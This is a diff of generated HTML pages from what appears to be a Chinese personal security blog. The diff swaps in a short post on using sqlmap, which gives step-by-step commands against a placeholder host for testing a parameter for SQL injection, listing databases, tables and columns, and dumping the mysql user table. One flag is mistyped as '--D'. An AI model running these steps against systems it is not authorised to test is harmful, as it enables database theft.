@@ -108,16 +108,16 @@
 
 
 
-<meta name="description" content="一半技术 一半生活">
+<meta name="description" content="sqlmap 是进行sql注入首选的工具，它可以帮助你快速的验证和利用一个sql注入漏洞。你可以在sqlmap的帮助下轻松的利用sql注入漏洞获取数据库数据甚至是getshell。下载安装1git clone https://github.com/sqlmapproject/sqlmap.git 当然，你也可以下载zip包直接解压，地址https://codeload.github.com/sql">
 <meta property="og:type" content="article">
-<meta property="og:title" content="甲乙方安全需求与痛点">
-<meta property="og:url" content="http://wsygoogol.github.io/2017/07/04/甲乙方安全需求与痛点/index.html">
+<meta property="og:title" content="sqlmap 使用">
+<meta property="og:url" content="http://wsygoogol.github.io/2016/08/11/sqlmap-使用/index.html">
 <meta property="og:site_name" content="SY0U&#39;s Blog">
-<meta property="og:description" content="一半技术 一半生活">
-<meta property="og:updated_time" content="2017-07-11T02:54:59.939Z">
+<meta property="og:description" content="sqlmap 是进行sql注入首选的工具，它可以帮助你快速的验证和利用一个sql注入漏洞。你可以在sqlmap的帮助下轻松的利用sql注入漏洞获取数据库数据甚至是getshell。下载安装1git clone https://github.com/sqlmapproject/sqlmap.git 当然，你也可以下载zip包直接解压，地址https://codeload.github.com/sql">
+<meta property="og:updated_time" content="2017-07-11T03:40:29.065Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="甲乙方安全需求与痛点">
-<meta name="twitter:description" content="一半技术 一半生活">
+<meta name="twitter:title" content="sqlmap 使用">
+<meta name="twitter:description" content="sqlmap 是进行sql注入首选的工具，它可以帮助你快速的验证和利用一个sql注入漏洞。你可以在sqlmap的帮助下轻松的利用sql注入漏洞获取数据库数据甚至是getshell。下载安装1git clone https://github.com/sqlmapproject/sqlmap.git 当然，你也可以下载zip包直接解压，地址https://codeload.github.com/sql">
 
 
 
@@ -145,13 +145,13 @@
 
 
 
-  <link rel="canonical" href="http://wsygoogol.github.io/2017/07/04/甲乙方安全需求与痛点/"/>
+  <link rel="canonical" href="http://wsygoogol.github.io/2016/08/11/sqlmap-使用/"/>
 
 
 
 
 
-  <title>甲乙方安全需求与痛点 | SY0U's Blog</title>
+  <title>sqlmap 使用 | SY0U's Blog</title>
   
 
 
@@ -270,7 +270,7 @@
   
 
   <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-    <link itemprop="mainEntityOfPage" href="http://wsygoogol.github.io/2017/07/04/甲乙方安全需求与痛点/">
+    <link itemprop="mainEntityOfPage" href="http://wsygoogol.github.io/2016/08/11/sqlmap-使用/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="SY0U">
@@ -287,7 +287,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">甲乙方安全需求与痛点</h1>
+          <h1 class="post-title" itemprop="name headline">sqlmap 使用</h1>
         
 
         <div class="post-meta">
@@ -299,8 +299,8 @@
               
                 <span class="post-meta-item-text">Veröffentlicht am</span>
               
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-07-04T13:57:12+08:00">
-                2017-07-04
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2016-08-11T11:28:48+08:00">
+                2016-08-11
               </time>
             
 
@@ -334,7 +334,15 @@
       
 
       
-        
+        <p>sqlmap 是进行sql注入首选的工具，它可以帮助你快速的验证和利用一个sql注入漏洞。你可以在sqlmap的帮助下轻松的利用sql注入漏洞获取数据库数据甚至是getshell。<br>下载安装<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">git <span class="built_in">clone</span> https://github.com/sqlmapproject/sqlmap.git</div></pre></td></tr></table></figure></p>
+<p>当然，你也可以下载zip包直接解压，地址<a href="https://codeload.github.com/sqlmapproject/sqlmap/legacy.zip/master" target="_blank" rel="external">https://codeload.github.com/sqlmapproject/sqlmap/legacy.zip/master</a><br>然后解压出来目录其实就可以直接使用了。<br>大部分人只需要这么用<br>直接对一个url进行注入检测,-u参数指定检测的url<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sqlmap -u <span class="string">"http://sqltest.com/sql1.php?user=jack&amp;id=1"</span></div></pre></td></tr></table></figure></p>
+<p>如果是post的参数：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sqlmap -u <span class="string">"http://sqltest.com/sql1.php"</span> --data=<span class="string">"user=jack&amp;id=1"</span></div></pre></td></tr></table></figure></p>
+<p>ok，如果输入的参数过多，你可以使用-p来指定具体存在注入的参数，比如指定参数id注入<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sqlmap -u <span class="string">"http://sqltest.com/sql1.php"</span> --data=<span class="string">"user=jack&amp;id=1"</span> -p id</div></pre></td></tr></table></figure></p>
+<p>下一步，获取数据库列表<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sqlmap -u <span class="string">"http://sqltest.com/sql1.php"</span> --data=<span class="string">"user=jack&amp;id=1"</span> -p id --dbs</div></pre></td></tr></table></figure></p>
+<p>获取指定数据库的表名<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sqlmap -u <span class="string">"http://sqltest.com/sql1.php"</span> --data=<span class="string">"user=jack&amp;id=1"</span> -p id --D mysql --tables</div></pre></td></tr></table></figure></p>
+<p>获取指定数据库及指定表的列名<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sqlmap -u <span class="string">"http://sqltest.com/sql1.php"</span> --data=<span class="string">"user=jack&amp;id=1"</span> -p id --D mysql -T user --columns</div></pre></td></tr></table></figure></p>
+<p>dump数据<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sqlmap -u <span class="string">"http://sqltest.com/sql1.php"</span> --data=<span class="string">"user=jack&amp;id=1"</span> -p id --D mysql -T user --dump</div></pre></td></tr></table></figure></p>
+
       
     </div>
 
@@ -348,12 +356,12 @@
   <script type="text/javascript" src="http://jslibs.wuxubj.cn/sweetalert_mini/jquery-1.7.1.min.js"></script>
   <script src="http://jslibs.wuxubj.cn/sweetalert_mini/sweetalert.min.js"></script>
   <link rel="stylesheet" type="text/css" href="http://jslibs.wuxubj.cn/sweetalert_mini/sweetalert.mini.css">
-  <p><span>本文标题:</span><a href="/2017/07/04/甲乙方安全需求与痛点/">甲乙方安全需求与痛点</a></p>
+  <p><span>本文标题:</span><a href="/2016/08/11/sqlmap-使用/">sqlmap 使用</a></p>
   <p><span>文章作者:</span><a href="/" title="访问 SY0U 的个人博客">SY0U</a></p>
-  <p><span>发布时间:</span>2017年07月04日 - 13:07</p>
-  <p><span>最后更新:</span>2017年07月11日 - 10:07</p>
-  <p><span>原始链接:</span><a href="/2017/07/04/甲乙方安全需求与痛点/" title="甲乙方安全需求与痛点">http://wsygoogol.github.io/2017/07/04/甲乙方安全需求与痛点/</a>
-    <span class="copy-path"  title="点击复制文章链接"><i class="fa fa-clipboard" data-clipboard-text="http://wsygoogol.github.io/2017/07/04/甲乙方安全需求与痛点/"  aria-label="复制成功！"></i></span>
+  <p><span>发布时间:</span>2016年08月11日 - 11:08</p>
+  <p><span>最后更新:</span>2017年07月11日 - 11:07</p>
+  <p><span>原始链接:</span><a href="/2016/08/11/sqlmap-使用/" title="sqlmap 使用">http://wsygoogol.github.io/2016/08/11/sqlmap-使用/</a>
+    <span class="copy-path"  title="点击复制文章链接"><i class="fa fa-clipboard" data-clipboard-text="http://wsygoogol.github.io/2016/08/11/sqlmap-使用/"  aria-label="复制成功！"></i></span>
   </p>
   <p><span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="https://creativecommons.org/licenses/by-nc-nd/4.0/" target="_blank" title="Attribution-NonCommercial-NoDerivatives 4.0 International (CC BY-NC-ND 4.0)">署名-非商业性使用-禁止演绎 4.0 国际</a> 转载请保留原文链接及作者。</p>
 </div>
@@ -408,8 +416,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2016/10/10/序列化和反序列化/" rel="next" title="序列化和反序列化">
-                <i class="fa fa-chevron-left"></i> 序列化和反序列化
+              <a href="/2016/08/08/OGNL机制和Struts2漏洞利用原理研究/" rel="next" title="OGNL机制和Struts2漏洞利用原理研究">
+                <i class="fa fa-chevron-left"></i> OGNL机制和Struts2漏洞利用原理研究
               </a>
             
           </div>
@@ -417,6 +425,10 @@
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2016/09/18/WAF-Bypass-技巧总结/" rel="prev" title="WAF Bypass 技巧总结">
+                WAF Bypass 技巧总结 <i class="fa fa-chevron-right"></i>
+              </a>
             
           </div>
         </div>
